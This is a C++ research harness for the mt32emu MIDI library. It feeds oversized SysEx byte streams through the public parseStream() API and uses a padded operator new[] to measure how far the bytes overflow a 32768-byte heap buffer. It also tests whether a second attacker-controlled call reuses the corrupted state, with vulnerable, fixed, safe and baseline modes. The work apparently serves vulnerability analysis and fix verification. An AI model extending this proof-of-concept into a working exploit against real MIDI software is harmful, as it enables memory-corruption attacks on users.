// W182 bounded experiment: after one oversized-SysEx parseStream() call, does
// a second attacker-supplied parseStream() call reuse or consume the corrupted
// buffer state? Uses the real pinned library and real Synth/parser; the extra
// 16384-byte `new[]` tail is a harness observation region, not an upstream
// object. No allocator shaping, malloc consumer or harness-forced dispatch:
// every subsequent action is an input byte sequence through the public API.
//
// Modes: vuln-repeat (40001 x 0x5a), fixed-repeat (same, pinned fix),
//        safe-repeat (32768, exact cap), baseline (two complete SysExes).
#include <cstdarg>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <unistd.h>

#include "mt32emu.h"

using namespace MT32Emu;

static unsigned char *g_tail = NULL;
static size_t g_tail_size = 0;
static unsigned long g_alloc_32768 = 0;

void *operator new[](size_t n) {
	void *p = malloc(n + 16384);
	if (n == 32768 && g_tail == NULL) {
		++g_alloc_32768;
		g_tail = static_cast<unsigned char *>(p) + n;
		g_tail_size = 16384;
	}
	return p;
}
void operator delete[](void *p) throw() { free(p); }
void operator delete[](void *p, size_t) throw() { free(p); }

static void emit(const char *fmt, ...) {
	char line[512];
	va_list ap;
	va_start(ap, fmt);
	int n = vsnprintf(line, sizeof line, fmt, ap);
	va_end(ap);
	if (n > 0) {
		if ((size_t)n > sizeof line) n = sizeof line;
		ssize_t ignored = write(1, line, (size_t)n);
		(void)ignored;
	}
}

namespace {

struct CountingParser : MidiStreamParser {
	int sysexCount;
	int shortCount;
	int realtimeCount;
	int debugCount;
	Bit32u lastSysexLength;

	CountingParser() : sysexCount(0), shortCount(0), realtimeCount(0),
		debugCount(0), lastSysexLength(0) {}
protected:
	void handleShortMessage(const Bit32u) { ++shortCount; }
	void handleSysex(const Bit8u *, const Bit32u length) {
		++sysexCount;
		lastSysexLength = length;
	}
	void handleSystemRealtimeMessage(const Bit8u) { ++realtimeCount; }
	void printDebug(const char *) { ++debugCount; }
};

void fill(Bit8u *buf, Bit32u len, Bit8u data, bool terminated) {
	memset(buf, data, len);
	buf[0] = 0xF0;
	if (terminated) buf[len - 1] = 0xF7;
}

void tail(const char *label) {
	size_t a = 0, b = 0;
	for (size_t i = 0; i < g_tail_size; ++i) {
		if (g_tail[i] == 0x5a) ++a;
		if (g_tail[i] == 0x37) ++b;
	}
	emit("%s alloc32768=%lu tail_0x5a=%zu/%zu tail_0x37=%zu/%zu first8=",
		label, g_alloc_32768, a, g_tail_size, b, g_tail_size);
	for (size_t i = 0; i < 8; ++i) emit("%02x", g_tail ? g_tail[i] : 0);
	emit("\n");
}

void state(const char *label, const CountingParser &p) {
	emit("%s sysex=%d lastlen=%u short=%d realtime=%d debug=%d\n",
		label, p.sysexCount, p.lastSysexLength, p.shortCount,
		p.realtimeCount, p.debugCount);
}

} // namespace

int main(int argc, char **argv) {
	const char *mode = argc > 1 ? argv[1] : "vuln-repeat";
	const bool baseline = NULL != strstr(mode, "baseline");
	const bool safe = NULL != strstr(mode, "safe");
	const Bit32u bigLen = safe ? 32768u : 40001u;

	Bit8u *first = new Bit8u[baseline ? 102u : bigLen];
	Bit8u *second = new Bit8u[baseline ? 102u : bigLen];
	fill(first, baseline ? 102u : bigLen, 0x5a, baseline);
	fill(second, baseline ? 102u : bigLen, 0x37, baseline);
	const Bit8u end = 0xF7;

	CountingParser parser;
	parser.parseStream(first, baseline ? 102u : bigLen);
	tail("after-first");
	state("after-first", parser);

	parser.parseStream(&end, 1);
	tail("after-end1");
	state("after-end1", parser);

	parser.parseStream(second, baseline ? 102u : bigLen);
	tail("after-second");
	state("after-second", parser);

	parser.parseStream(&end, 1);
	tail("after-end2");
	state("after-end2", parser);

	Bit8u good[102];
	fill(good, 102, 0x11, true);
	parser.parseStream(good, 102);
	tail("after-complete");
	state("after-complete", parser);

	return 0; // leave allocations live: no frees or formatting after the store
}
